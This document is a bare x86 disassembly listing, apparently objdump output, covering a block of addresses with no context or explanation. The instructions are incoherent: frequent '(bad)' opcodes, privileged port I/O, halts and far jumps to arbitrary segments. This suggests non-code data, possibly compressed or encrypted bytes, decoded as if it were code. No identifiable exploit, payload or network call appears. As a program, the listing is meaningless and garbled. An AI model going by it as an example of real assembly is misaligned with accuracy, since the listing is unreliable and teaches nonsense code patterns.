  427fa3:	push   esi
  427fa4:	sub    ebx,DWORD PTR [ebp-0x39]
  427fa7:	stos   BYTE PTR es:[edi],al
  427fa8:	add    DWORD PTR [eax],eax
  427faa:	pop    es
  427fab:	add    DWORD PTR [eax],eax
  427fad:	add    al,dl
  427faf:	scas   eax,DWORD PTR es:[edi]
  427fb0:	sar    BYTE PTR [edx+eax*8+0x7e],1
  427fb4:	mov    WORD PTR [edi],es
  427fb6:	sub    esi,DWORD PTR [edi]
  427fb8:	cmp    bh,dh
  427fba:	cmp    BYTE PTR [ebx-0x80],bh
  427fbd:	aam    0x4c
  427fbf:	push   ss
  427fc0:	mov    edi,ebp
  427fc2:	xchg   edi,eax
  427fc3:	xor    edi,DWORD PTR [ebp-0x1b56644b]
  427fc9:	popf   
  427fca:	imul   edi,DWORD PTR [edi-0x612ac7a3],0x42e57e70
  427fd4:	in     al,dx
  427fd5:	xchg   edi,eax
  427fd6:	mov    edx,0xab6ca641
  427fdb:	repnz jmp 0xc1e0:0x9d91560c
  427fe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427fe4:	call   0xa559:0x52e222d9
  427feb:	adc    eax,0xbc0ed2c8
  427ff0:	jne    0x428027
  427ff2:	push   edx
  427ff3:	jns    0x428015
  427ff5:	sbb    bl,al
  427ff7:	adc    bh,BYTE PTR [esi+0x11]
  427ffa:	xchg   esp,eax
  427ffb:	test   BYTE PTR [ebp-0x5d65b622],ch
  428001:	xchg   BYTE PTR [ecx],dl
  428003:	push   ds
  428004:	inc    ebx
  428005:	fstp   QWORD PTR [ebp+0x61]
  428008:	push   0x46af8ee1
  42800d:	dec    esi
  42800e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42800f:	xchg   ebp,eax
  428010:	jl     0x427f96
  428012:	and    dh,BYTE PTR [edi]
  428014:	sub    eax,0x21c49bd7
  428019:	and    BYTE PTR [ebx],0x6d
  42801c:	jo     0x427fd8
  42801e:	inc    edi
  42801f:	fdiv   DWORD PTR [eax-0x3b]
  428022:	rcr    DWORD PTR [edx],cl
  428024:	jg     0x42800f
  428026:	jnp    0x428039
  428028:	inc    esp
  428029:	loop   0x42805b
  42802b:	stc    
  42802c:	repz ror BYTE PTR [ebp-0x54246304],0x1
  428034:	jg     0x42808e
  428036:	(bad)  
  428037:	outs   dx,DWORD PTR ds:[esi]
  428038:	jp     0x42804b
  42803a:	arpl   WORD PTR [eax+eax*1+0x5e],bp
  42803e:	scas   eax,DWORD PTR es:[edi]
  42803f:	ficomp WORD PTR ds:0x6ba3385
  428045:	mov    cs,WORD PTR [ecx-0x48]
  428048:	scas   al,BYTE PTR es:[edi]
  428049:	fmul   DWORD PTR ds:0x2b7dcd5c
  42804f:	push   ebx
  428050:	mov    dl,0xa6
  428052:	fld    DWORD PTR [eax]
  428054:	repz sub DWORD PTR [esi+0x52],ecx
  428058:	(bad)  
  428059:	ret    0xba65
  42805c:	mov    edx,0x50b07e47
  428061:	shr    BYTE PTR [eax],cl
  428063:	and    DWORD PTR [ebx-0x67],eax
  428066:	cmp    eax,0x2d432e3e
  42806b:	xchg   ecx,eax
  42806c:	aaa    
  42806d:	fldenv [esi]
  42806f:	es and eax,0x1ee0d9c1
  428075:	out    dx,al
  428076:	xchg   edx,eax
  428077:	in     al,dx
  428078:	mov    dh,bl
  42807a:	pop    es
  42807b:	stc    
  42807c:	cli    
  42807d:	jmp    0x6fc2:0x4fe92fe5
  428084:	xchg   ecx,eax
  428085:	or     BYTE PTR [eax+ebp*8-0x17],bl
  428089:	inc    edx
  42808a:	or     al,0x64
  42808d:	sbb    DWORD PTR [esi],0xffffffcb
  428090:	scas   al,BYTE PTR es:[edi]
  428091:	mov    ecx,ss
  428093:	dec    BYTE PTR [esi-0xcdd68ab]
  428099:	push   ebx
  42809a:	xchg   esi,eax
  42809b:	mov    ebx,ds
  42809d:	push   cs
  42809e:	fidivr DWORD PTR [edx-0x483e9869]
  4280a4:	shl    DWORD PTR [ebx+0x30abe571],0x2c
  4280ab:	push   edi
  4280ac:	(bad)  
  4280ad:	mov    ebp,0x53ed3603
  4280b2:	jnp    0x428106
  4280b4:	jbe    0x4280b6
	...
  428116:	fucomip st,st(6)
  428118:	std    
  428119:	dec    esp
  42811a:	std    
  42811b:	pop    edi
  42811c:	(bad)  
  42811d:	(bad)  
  42811e:	cmp    al,0x36
  428120:	cmp    esp,ebp
  428122:	add    al,0x64
  428124:	xchg   edi,eax
  428125:	icebp  
  428126:	into   
  428127:	stos   DWORD PTR es:[edi],eax
  428128:	add    DWORD PTR [eax],eax
  42812a:	pop    es
  42812b:	add    DWORD PTR [eax],eax
  42812d:	add    BYTE PTR [ebx+0x24],bl
  428130:	test   al,0xbf
  428132:	stos   BYTE PTR es:[edi],al
  428133:	stc    
  428134:	sub    DWORD PTR [edi+0x4a],ecx
  428137:	cli    
  428138:	hlt    
  428139:	stos   BYTE PTR es:[edi],al
  42813a:	push   edx
  42813b:	jbe    0x428111
  42813d:	mov    bh,BYTE PTR [edx+0xd]
  428140:	loopne 0x428199
  428142:	pop    edi
  428143:	mov    ah,0x6a
  428145:	in     al,0x20
  428147:	xchg   ebp,eax
  428148:	sahf   
  428149:	jle    0x42817a
  42814b:	dec    ebx
  42814c:	push   ds
  42814d:	xchg   esp,eax
  42814e:	inc    ebx
  42814f:	fcmovnbe st,st(3)
  428151:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428152:	leave  
  428153:	adc    eax,0x3f62dc49
  428158:	out    0x54,eax
  42815a:	call   0x896e9753
  42815f:	cdq    
  428160:	xchg   edx,eax
  428161:	inc    edx
  428162:	mov    al,0x7e
  428164:	adc    BYTE PTR [edi+ebp*4-0x62975769],ah
  42816b:	and    eax,0x91b7e98d
  428170:	mov    eax,DWORD PTR [ebx]
  428172:	mov    dh,0x68
  428174:	inc    edx
  428175:	or     eax,0x65527d1d
  42817a:	pop    ebp
  42817b:	les    edi,FWORD PTR [esi+ebx*4-0xf83fbf]
  428182:	jno    0x428148
  428184:	and    DWORD PTR [esi+eax*8],edx
  428187:	mov    al,ds:0x2fe9e4b4
  42818c:	ret    0xbf3f
  42818f:	add    ebp,DWORD PTR [ecx]
  428191:	sbb    cl,dl
  428193:	xchg   edx,eax
  428194:	jle    0x428148
  428196:	push   edx
  428197:	(bad)  
  428198:	aas    
  428199:	sub    cl,BYTE PTR [eax]
  42819b:	imul   ebp,DWORD PTR [eax-0x76ded0db],0x6f8672ca
  4281a5:	test   DWORD PTR [eax+0x16],edi
  4281a8:	bound  esi,QWORD PTR [esi+0x353d0ffb]
  4281ae:	shl    BYTE PTR [ebp+0x52],cl
  4281b1:	outs   dx,BYTE PTR ds:[esi]
  4281b2:	inc    ecx
  4281b3:	nop
  4281b4:	out    dx,al
  4281b5:	sahf   
  4281b6:	fidivr WORD PTR [eax+0x41]
  4281b9:	(bad)  
  4281ba:	push   cs
  4281bb:	jg     0x4281a2
  4281bd:	push   esp
  4281be:	mov    ds:0x879f0575,eax
  4281c3:	sti    
  4281c4:	xor    eax,0x370a63da
  4281c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4281ca:	sbb    ecx,DWORD PTR [ecx+0x7c]
  4281cd:	and    al,BYTE PTR [ebp-0x16]
  4281d0:	or     al,0xf0
  4281d2:	pop    ecx
  4281d3:	ret    
  4281d4:	test   DWORD PTR [esi+0x7e],eax
  4281d7:	push   DWORD PTR [edi-0x47]
  4281da:	sub    BYTE PTR [edx],bl
  4281dc:	adc    eax,0x6d11b578
  4281e1:	fidiv  WORD PTR [ebx-0x78]
  4281e4:	push   ebp
  4281e5:	xchg   esi,eax
  4281e6:	into   
  4281e7:	mov    ebp,0x1dadb1a1
  4281ec:	imul   ebx,DWORD PTR [esi+0x26],0x4a
  4281f0:	sbb    DWORD PTR ds:0x884bca27,edx
  4281f6:	or     DWORD PTR [esi-0xa2e7d58],eax
  4281fc:	xor    BYTE PTR [edi-0x28],dh
  4281ff:	mov    ah,0x95
  428201:	clc    
  428202:	mov    ds:0x111bf55c,eax
  428207:	push   ecx
  428208:	xchg   edi,eax
  428209:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42820a:	fsubr  QWORD PTR [ebp+0xd7a4cc6]
  428210:	lock pop ss
  428212:	push   edi
  428213:	and    BYTE PTR [ebx],al
  428215:	rcl    DWORD PTR ds:0xfe310b07,cl
  42821b:	sbb    eax,0x8a2253c9
  428220:	jbe    0x42828a
  428222:	cmc    
  428223:	les    edx,FWORD PTR [edi-0x487aaf16]
  428229:	or     edi,DWORD PTR [edx+0x5319d0d6]
  42822f:	push   ebp
  428230:	cmp    DWORD PTR [edx],eax
  428232:	es push esi
  428234:	aad    0x0
	...
  428296:	(bad)  
  428297:	fidiv  WORD PTR [esi]
  428299:	loop   0x4282da
  42829b:	jmp    0x52eb:0x1ad8ffd7
  4282a2:	hlt    
  4282a3:	shl    dl,1
  4282a5:	rcl    ch,cl
  4282a7:	lods   al,BYTE PTR ds:[esi]
  4282a8:	add    DWORD PTR [eax],eax
  4282aa:	pop    es
  4282ab:	add    DWORD PTR [eax],eax
  4282ad:	add    BYTE PTR [ebp+0x2c4c2e92],dl
  4282b3:	jmp    0x84442410
  4282b8:	jge    0x428330
  4282ba:	mov    ecx,0x2a10840a
  4282bf:	or     al,BYTE PTR [esi]
  4282c1:	pop    esp
  4282c2:	mov    esp,0x63c6e95a
  4282c7:	fsubr  st(6),st
  4282c9:	fisubr DWORD PTR [ebp+0x69]
  4282cc:	mov    eax,0x2b608ac5
  4282d1:	xor    eax,DWORD PTR [ebx]
  4282d3:	scas   eax,DWORD PTR es:[edi]
  4282d4:	pop    edx
  4282d5:	mov    dh,0xe
  4282d7:	leave  
  4282d8:	push   ds
  4282d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4282da:	add    BYTE PTR [ecx+ebp*1-0x3cc0a5b8],cl
  4282e1:	pop    ds
  4282e2:	jne    0x42829a
  4282e4:	hlt    
  4282e5:	popf   
  4282e6:	mov    ebp,0x7521165a
  4282eb:	and    al,0x8e
  4282ed:	push   ds
  4282ee:	hlt    
  4282ef:	mov    bl,0xe4
  4282f1:	retf   0xfb45
  4282f4:	inc    ebp
  4282f5:	or     al,bl
  4282f7:	loope  0x42831d
  4282f9:	pop    ebx
  4282fa:	mov    ebx,0x99197eaa
  4282ff:	int    0xc1
  428301:	out    dx,eax
  428302:	data16 xor al,0xa
  428305:	das    
  428306:	fcmovnb st,st(3)
  428308:	mov    edi,0x8e5714e5
  42830d:	arpl   WORD PTR [ecx-0x1],dx
  428310:	scas   al,BYTE PTR es:[edi]
  428311:	cmp    ecx,DWORD PTR [eax]
  428313:	xchg   DWORD PTR [eax+0xea69796],esp
  428319:	not    ah
  42831b:	repnz push ss
  42831d:	lea    edi,[ebp+0x32ee2164]
  428323:	mov    edi,0x4acf7a8c
  428328:	sbb    ah,ch
  42832a:	or     eax,0xe1568016
  42832f:	mov    esi,ebp
  428331:	idiv   DWORD PTR [eax+0x42]
  428334:	jmp    0x428357
  428336:	pop    edx
  428337:	add    al,0x86
  428339:	xchg   ebp,eax
  42833a:	aaa    
  42833b:	push   ss
  42833c:	push   es
  42833d:	repz cli 
  42833f:	inc    ecx
  428340:	rcr    ebx,1
  428342:	std    
  428343:	sbb    DWORD PTR [ecx+0x5fbebe66],edi
  428349:	cmc    
  42834a:	cmp    ebp,DWORD PTR [edi+0x75]
  42834d:	sbb    eax,0x69222703
  428352:	and    BYTE PTR [ebp+0x5f],0x40
  428356:	jb     0x428342
  428358:	mov    ecx,0x58832f83
  42835d:	inc    edx
  42835e:	pop    edi
  42835f:	in     eax,dx
  428360:	and    BYTE PTR cs:[esi],ah
  428363:	in     al,dx
  428364:	inc    esp
  428365:	jp     0x428313
  428367:	out    dx,al
  428368:	scas   eax,DWORD PTR es:[edi]
  428369:	rcl    DWORD PTR [edx],0xb1
  42836c:	iret   
  42836d:	in     al,0xa8
  42836f:	mov    ds:0x8ee13fe9,eax
  428374:	rol    DWORD PTR [ecx+0x1a],cl
  428377:	xchg   ecx,eax
  428378:	inc    edx
  428379:	stc    
  42837a:	mov    cs,edi
  42837c:	mov    bh,dh
  42837e:	or     DWORD PTR [ebx],edi
  428380:	inc    edi
  428381:	sti    
  428382:	jb     0x42835d
  428384:	inc    edi
  428385:	loop   0x4283f1
  428387:	in     eax,0xcd
  428389:	mov    ebx,0x149b4f1a
  42838e:	div    DWORD PTR ds:0x4c176f24
  428394:	pop    ebx
  428395:	mov    WORD PTR [edx+edi*2],?
  428398:	fdivrp st(6),st
  42839a:	or     al,0x70
  42839c:	out    0x7d,ax
  42839f:	test   BYTE PTR [edx+0x2d],ch
  4283a2:	(bad)  
  4283a3:	sti    
  4283a4:	lods   al,BYTE PTR ds:[esi]
  4283a5:	fcom   QWORD PTR [ebx*8-0x3f1ec7b7]
  4283ac:	out    0x8e,al
  4283ae:	stc    
  4283af:	loopne 0x42837d
  4283b1:	in     eax,0x86
  4283b3:	aas    
  4283b4:	pushf  
	...
  428415:	add    BYTE PTR [esi],cl
  428417:	xchg   esp,eax
  428418:	jg     0x42847d
  42841a:	(bad)  
  42841b:	jmp    0x42843b
  42841d:	std    
  42841e:	push   ebx
  42841f:	int    0x1
  428421:	(bad)  
  428422:	adc    BYTE PTR [edi-0x52230769],ah
  428428:	add    DWORD PTR [eax],eax
  42842a:	pop    es
  42842b:	add    DWORD PTR [eax],eax
  42842d:	add    BYTE PTR [edi+eax*2+0x307f9978],dl
  428434:	cmc    
  428435:	fidiv  DWORD PTR [esp+eiz*8]
  428438:	aas    
  428439:	mov    al,ds:0x459108c6
  42843e:	shl    BYTE PTR [ebp-0x4d],1
  428441:	sbb    BYTE PTR [esi+0x10],bl
  428444:	jmp    0x428427
  428446:	dec    ebp
  428447:	cmp    BYTE PTR [eax+0x32],bl
  42844a:	or     ch,BYTE PTR [eax]
  42844c:	inc    ebp
  42844d:	mov    cl,BYTE PTR [esi-0x13]
  428450:	xor    bh,bh
  428452:	jmp    0x9d46:0x97032190
  428459:	inc    ebp
  42845a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42845b:	jbe    0x428453
  42845d:	mov    esi,0x7f07250b
  428462:	sub    ch,ah
  428464:	jmp    0x883a:0x81fb782b
  42846b:	shl    DWORD PTR [edx+0x72],cl
  42846e:	loopne 0x42840e
  428470:	clc    
  428471:	adc    eax,0xa7d10674
  428476:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428477:	dec    esi
  428478:	dec    esi
  428479:	add    ecx,esi
  42847b:	sbb    esi,esp
  42847d:	sti    
  42847e:	imul   ebx,DWORD PTR [eax],0x44
  428481:	and    BYTE PTR [edi-0x31],al
  428484:	(bad)  
  428485:	fsubr  QWORD PTR [edi+0x16]
  428488:	push   ss
  428489:	xlat   BYTE PTR ds:[ebx]
  42848a:	adc    BYTE PTR [ebx+0x73],ah
  42848d:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42848f:	push   esp
  428490:	call   0xa049fda6
  428495:	and    DWORD PTR [ebx+eax*1],0xc8a518b1
  42849c:	inc    eax
  42849d:	icebp  
  42849e:	dec    ebp
  42849f:	les    ebp,FWORD PTR [eax+esi*4+0xc]
  4284a3:	push   0xffffffa2
  4284a5:	jmp    0x428512
  4284a7:	aas    
  4284a8:	or     eax,0x8d6b4969
  4284ad:	mov    edi,esp
  4284af:	cs dec esp
  4284b1:	out    0xe1,al
  4284b3:	pop    ebx
  4284b4:	xchg   esp,eax
  4284b5:	and    ch,dh
  4284b7:	or     BYTE PTR [esi-0x69ffd012],0x38
  4284be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4284bf:	div    DWORD PTR [ebx-0x66]
  4284c2:	inc    ecx
  4284c3:	add    DWORD PTR ds:0x6cb3636f,ebp
  4284c9:	sub    DWORD PTR [esi],esi
  4284cb:	sbb    eax,DWORD PTR [edx+0x16e6b73d]
  4284d1:	xor    al,ch
  4284d3:	sub    BYTE PTR [edi+0x4098ac1b],dl
  4284d9:	and    eax,0xceb07419
  4284de:	jbe    0x428505
  4284e0:	ss cmp dh,ah
  4284e3:	jp     0x4284d7
  4284e5:	ds ja  0x4284c0
  4284e8:	mov    ds:0xb449bd74,al
  4284ed:	inc    edi
  4284ee:	in     al,0xde
  4284f0:	push   ebx
  4284f1:	and    eax,0x9a72c932
  4284f6:	push   0x76906eba
  4284fb:	jl     0x42849e
  4284fd:	outs   dx,BYTE PTR ds:[esi]
  4284fe:	outs   dx,BYTE PTR ds:[esi]
  4284ff:	es mov edi,0x85adc101
  428505:	pop    es
  428506:	(bad)  
  428507:	imul   esp,esi,0x9c077b3a
  42850d:	stc    
  42850e:	pop    eax
  42850f:	jmp    0x428538
  428511:	push   eax
  428512:	push   edi
  428513:	sbb    dl,BYTE PTR [ebx+0x9]
  428516:	jmp    0x4284a7
  428518:	jno    0x42852a
  42851a:	mov    bh,0xff
  42851c:	test   eax,0x15bea66a
  428521:	out    dx,al
  428522:	sub    esp,DWORD PTR [ebx-0x56]
  428525:	pop    edi
  428526:	out    0x1d,al
  428528:	inc    edi
  428529:	sbb    al,0x8c
  42852b:	xor    DWORD PTR [edi-0x3376a134],edi
  428531:	loope  0x428503
  428533:	cmp    al,0xcf
	...
  428595:	add    BYTE PTR [ecx-0xa],dl
  428598:	xor    eax,0x5bffb73e
  42859d:	dec    ebp
  42859f:	sar    BYTE PTR [ecx-0x50],cl
  4285a2:	in     al,dx
  4285a3:	adc    BYTE PTR [ecx+esi*1-0x1d],al
  4285a7:	scas   al,BYTE PTR es:[edi]
  4285a8:	add    DWORD PTR [eax],eax
  4285aa:	pop    es
  4285ab:	add    DWORD PTR [eax],eax
  4285ad:	add    bl,cl
  4285af:	je     0x428626
  4285b1:	xor    eax,0x271bd349
  4285b6:	inc    ecx
  4285b7:	or     eax,0xf29277cf
  4285bc:	lock jnp 0x428582
  4285bf:	adc    edx,ebp
  4285c1:	pop    ebx
  4285c2:	call   0x59069c42
  4285c7:	clc    
  4285c8:	sub    al,0xd
  4285ca:	test   DWORD PTR [eax],0x16c98186
  4285d0:	pop    ds
  4285d1:	sub    eax,0xf20e2cf3
  4285d6:	imul   edx,DWORD PTR [eax-0x6d],0xffffff9f
  4285da:	fdiv   DWORD PTR [edi+0x6d370468]
  4285e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4285e1:	cli    
  4285e2:	fldcw  WORD PTR [esi]
  4285e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4285e5:	(bad)  
  4285e6:	out    dx,eax
  4285e7:	add    al,0x6e
  4285e9:	stc    
  4285ea:	hlt    
  4285eb:	test   DWORD PTR [ebx+0x3a],ebx
  4285ee:	jbe    0x4285cc
  4285f0:	outs   dx,DWORD PTR ds:[esi]
  4285f1:	xchg   BYTE PTR [ecx+0x35e54cbb],ch
  4285f7:	inc    ebx
  4285f8:	data16 mov al,ds:0x7dab4ac4
  4285fe:	and    esi,DWORD PTR [edx-0x2b]
  428601:	xchg   ebp,eax
  428602:	or     eax,0xc676fd3b
  428607:	push   edi
  428608:	nop
  428609:	(bad)  
  42860a:	dec    DWORD PTR [edi-0xc3adfa]
  428610:	arpl   ax,di
  428612:	sbb    cl,BYTE PTR [eax]
  428614:	sbb    cl,BYTE PTR [edx+0x6758e2dc]
  42861a:	jae    0x4285d0
  42861c:	cwde   
  42861d:	repnz scas al,BYTE PTR es:[edi]
  42861f:	and    al,0x5f
  428621:	leave  
  428622:	retf   0xae81
  428625:	ds dec ebx
  428627:	mov    dl,0xfa
  428629:	loopne 0x428641
  42862b:	jns    0x428692
  42862d:	enter  0x18ff,0xd5
  428631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428632:	sub    DWORD PTR [ecx-0x2c87b760],edx
  428638:	xor    BYTE PTR [eax],al
  42863a:	sahf   
  42863b:	push   0x48
  42863d:	ds push edi
  42863f:	dec    ecx
  428640:	mov    edx,edx
  428642:	ja     0x4285f6
  428644:	and    eax,0x6b2b8123
  428649:	adc    ch,BYTE PTR [eax]
  42864b:	and    BYTE PTR [esi-0x66d22734],bl
  428651:	pop    esp
  428652:	call   0x64bd:0x852603f4
  428659:	call   0x42639288
  42865e:	dec    eax
  42865f:	push   ss
  428660:	jmp    0x8a3f5bf4
  428665:	paddd  mm3,mm0
  428668:	sub    DWORD PTR [ecx+0x78de44a9],ebx
  42866e:	sti    
  42866f:	sub    bl,bl
  428671:	out    0x14,eax
  428673:	mov    ebp,0xb8dbd617
  428678:	retf   
  428679:	std    
  42867a:	fsub   QWORD PTR [eax+0x46]
  42867d:	fidivr WORD PTR [edx]
  42867f:	mov    ebx,0xf46ee62f
  428684:	jecxz  0x428621
  428686:	retf   
  428687:	or     al,0xa2
  428689:	mov    edi,ebp
  42868b:	sub    al,0xb9
  42868d:	inc    esp
  42868e:	xor    edi,DWORD PTR [ecx+0x1f83537]
  428694:	(bad)  
  428695:	das    
  428696:	std    
  428697:	sub    al,0xb6
  428699:	dec    edi
  42869a:	mov    ah,0x2a
  42869c:	dec    ebp
  42869d:	push   cs
  42869e:	fcomip st,st(2)
  4286a0:	sahf   
  4286a1:	test   al,0x46
  4286a3:	into   
  4286a4:	push   ebx
  4286a5:	sub    DWORD PTR [ecx-0x5a],eax
  4286a8:	aad    0x27
  4286aa:	dec    eax
  4286ab:	jp     0x428679
  4286ad:	jnp    0x428706
  4286af:	pop    eax
  4286b0:	push   0x5af97247
	...
  428715:	add    BYTE PTR [esi+0x5b],dl
  428718:	xor    al,0x78
  42871a:	cmp    eax,0x967f5e7f
  42871f:	or     bh,BYTE PTR ss:[ecx+0x7439102a]
  428726:	jmp    0x1:0x70001af
  42872d:	add    bl,dh
  42872f:	dec    ebp
  428730:	dec    ebx
  428731:	inc    ebp
  428732:	xchg   esp,eax
  428733:	out    0xcb,eax
  428735:	mov    esp,0x2c69c283
  42873a:	test   eax,0x2ed6dceb
  42873f:	or     BYTE PTR [ebx+0x1e576b05],0xa
  428746:	pop    ebp
  428747:	repz sub ch,BYTE PTR [ebp-0x17ef9b0e]
  42874e:	or     eax,0x4cd93742
  428753:	test   eax,0x9a4d239b
  428758:	xchg   esp,eax
  428759:	je     0x42879e
  42875b:	adc    DWORD PTR [ebx+0x39910d70],ebx
  428761:	dec    ebx
  428762:	fstp   TBYTE PTR [ebx]
  428764:	sbb    al,0xf0
  428766:	test   DWORD PTR [edx-0x2a0d26e],ebp
  42876c:	clc    
  42876d:	and    BYTE PTR [eax],al
  42876f:	sbb    cl,BYTE PTR [edx+0x3b]
  428772:	mov    dl,0x2e
  428774:	lods   al,BYTE PTR ds:[esi]
  428775:	es xchg ebp,eax
  428777:	mov    esi,0xa0fb2b05
  42877c:	pop    es
  42877d:	dec    esp
  42877e:	inc    ebp
  42877f:	arpl   WORD PTR [edi+edx*2],bx
  428782:	xchg   ebx,eax
  428783:	jle    0x428785
  428785:	dec    ecx
  428786:	fld    QWORD PTR [edi-0x9]
  428789:	pop    ecx
  42878a:	pop    eax
  42878b:	ret    
  42878c:	adc    eax,0xdac3192d
  428791:	mov    al,gs:0xd8741506
  428797:	add    al,0x62
  428799:	sub    eax,0xf1bb2e62
  42879e:	jae    0x42879a
  4287a0:	pushf  
  4287a1:	jb     0x42872d
  4287a3:	jmp    0xa05e:0xb97605cf
  4287aa:	xchg   BYTE PTR [edx-0x51ae3789],dh
  4287b0:	adc    ch,BYTE PTR ds:[ebx]
  4287b3:	mov    dl,0x87
  4287b5:	push   ds
  4287b6:	push   edi
  4287b7:	test   al,0x48
  4287b9:	in     eax,dx
  4287ba:	mov    dl,dl
  4287bc:	and    eax,0x6f0be886
  4287c1:	inc    ebp
  4287c2:	adc    BYTE PTR [ebx+0x63],bl
  4287c5:	xor    ch,dl
  4287c7:	push   eax
  4287c8:	xor    eax,ebp
  4287ca:	or     esi,edi
  4287cc:	xchg   edi,eax
  4287cd:	repz inc esp
  4287cf:	and    al,0xfc
  4287d1:	fwait
  4287d2:	test   al,0xa
  4287d4:	and    BYTE PTR [ebx],dh
  4287d6:	test   ebp,0x6f79bc4c
  4287dc:	xor    ch,BYTE PTR [ebx+ebx*1]
  4287df:	xor    DWORD PTR [edx+0x6c],0xffffff91
  4287e3:	cmp    BYTE PTR [esi-0x7c31ab6a],0x66
  4287ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4287eb:	mov    ds:0x17276907,al
  4287f0:	add    BYTE PTR [ebx],ch
  4287f2:	loopne 0x42884b
  4287f4:	lahf   
  4287f5:	mov    al,0x8d
  4287f7:	jno    0x42881b
  4287f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4287fa:	jle    0x428781
  4287fc:	adc    cl,BYTE PTR [esp+edi*4]
  4287ff:	sub    eax,esi
  428801:	scas   al,BYTE PTR es:[edi]
  428802:	and    BYTE PTR [ecx+esi*4-0x1a],cl
  428806:	loopne 0x42879e
  428808:	pusha  
  428809:	lods   eax,DWORD PTR ds:[esi]
  42880a:	out    dx,eax
  42880b:	mov    cl,0xf9
  42880d:	not    BYTE PTR ds:0x24f53629
  428813:	sbb    BYTE PTR [ecx-0x5e87451b],0x82
  42881a:	mov    dl,0x86
  42881c:	outs   dx,DWORD PTR ds:[esi]
  42881d:	shl    DWORD PTR [edi-0x3],cl
  428820:	dec    edi
  428821:	int    0xe
  428823:	popf   
  428824:	clc    
  428825:	jae    0x428899
  428827:	xchg   esp,eax
  428828:	sub    al,0xdf
  42882a:	push   ebp
  42882b:	xchg   esi,edi
  42882d:	ins    BYTE PTR es:[edi],dx
  42882e:	or     eax,0xdbddd222
  428833:	xchg   ebx,eax
  428834:	pop    ecx
	...
  428895:	add    BYTE PTR [esi],ah
  428897:	jp     0x42890a
  428899:	les    edi,FWORD PTR [ebp-0x31]
  42889c:	mov    bh,0xfa
  42889e:	ret    
  42889f:	ja     0x428848
  4288a1:	test   DWORD PTR [ecx-0xea098c9],ecx
  4288a7:	mov    al,0x1
  4288a9:	add    BYTE PTR [edi],al
  4288ab:	add    DWORD PTR [eax],eax
  4288ad:	add    BYTE PTR [ebx+0x45280c13],cl
  4288b3:	loope  0x428852
  4288b5:	loope  0x42890b
  4288b7:	(bad)  
  4288b8:	or     eax,0x5ded5062
  4288bd:	les    ecx,FWORD PTR [esi+edx*8-0x70]
  4288c1:	push   ebp
  4288c2:	push   ecx
  4288c3:	dec    esp
  4288c4:	data16 adc bh,BYTE PTR ds:0xc0a80178
  4288cb:	mov    ecx,0x9e518aa6
  4288d0:	daa    
  4288d1:	sbb    eax,0x28de01fd
  4288d6:	jge    0x428921
  4288d8:	cmc    
  4288d9:	call   0x350c:0x68773799
  4288e0:	test   DWORD PTR [edi],0xdbde542c
  4288e6:	inc    esi
  4288e7:	inc    edi
  4288e8:	popf   
  4288e9:	sub    dh,BYTE PTR ds:0xe67969a0
  4288ef:	loope  0x428900
  4288f1:	call   0x730a9704
  4288f6:	sub    al,0x5f
  4288f8:	or     BYTE PTR [edx+0x5],ah
  4288fb:	cdq    
  4288fc:	push   ss
  4288fd:	adc    al,0xe
  4288ff:	cmp    esp,DWORD PTR [ebx+0x205627ac]
  428905:	out    0xed,al
  428907:	sbb    DWORD PTR [ecx-0x686933ce],0x28ea3cf2
  428911:	int3   
  428912:	push   ss
  428913:	or     edx,DWORD PTR [ebx]
  428915:	push   esi
  428916:	gs mov ebp,0xbaa14110
  42891c:	mov    esi,0xd04c83fc
  428921:	loopne 0x428977
  428923:	push   esi
  428924:	add    al,ah
  428926:	lods   al,BYTE PTR ds:[esi]
  428927:	jbe    0x428983
  428929:	shl    BYTE PTR [eax],0xcd
  42892c:	mov    eax,ecx
  42892e:	add    edi,DWORD PTR [edi+0x56]
  428931:	pop    ds
  428932:	inc    eax
  428933:	mov    bl,0xbc
  428935:	bound  edx,QWORD PTR [ecx-0x19f2a870]
  42893b:	pop    esp
  42893c:	jge    0x428934
  42893e:	cmp    ch,ah
  428940:	pop    edx
  428941:	stc    
  428942:	mov    ebp,0xf2f3609d
  428947:	aad    0xba
  428949:	dec    edi
  42894a:	into   
  42894b:	jns    0x4288f5
  42894d:	sub    esi,DWORD PTR [eax-0x567c3eb2]
  428953:	jae    0x428953
  428955:	ja     0x42891a
  428957:	cmp    eax,0x117341b0
  42895c:	mov    bl,0xfb
  42895e:	and    BYTE PTR [ecx-0x31],0x2c
  428962:	cdq    
  428963:	sub    edi,edx
  428965:	mov    eax,DWORD PTR [ebp+0x1bd88abc]
  42896b:	adc    al,0x12
  42896d:	xor    ah,BYTE PTR ds:0x8ab8eafd
  428973:	pop    ebx
  428974:	xlat   BYTE PTR ds:[ebx]
  428975:	dec    ecx
  428976:	sbb    DWORD PTR [ecx],0x19
  428979:	jb     0x42898c
  42897b:	dec    eax
  42897c:	(bad)  
  42897d:	pop    ecx
  42897e:	dec    ecx
  42897f:	sub    esi,DWORD PTR [edx+0x15]
  428982:	js     0x4289e9
  428984:	mov    edi,0x801d6646
  428989:	fistp  WORD PTR [eax+0xeb3cddf]
  42898f:	inc    esi
  428990:	int3   
  428991:	(bad)  
  428992:	(bad)  
  428994:	scas   eax,DWORD PTR es:[edi]
  428995:	dec    eax
  428996:	lods   eax,DWORD PTR ds:[esi]
  428997:	xchg   DWORD PTR [edi-0x369529a0],edx
  42899d:	and    esi,eax
  42899f:	rol    BYTE PTR [eax+eax*1-0x17],1
  4289a3:	rcl    BYTE PTR [eax-0x4],0xbe
  4289a7:	pop    ecx
  4289a8:	pop    esi
  4289a9:	push   0x8f735338
  4289ae:	add    DWORD PTR [edx],eax
  4289b0:	or     DWORD PTR [edx-0x1b],ebx
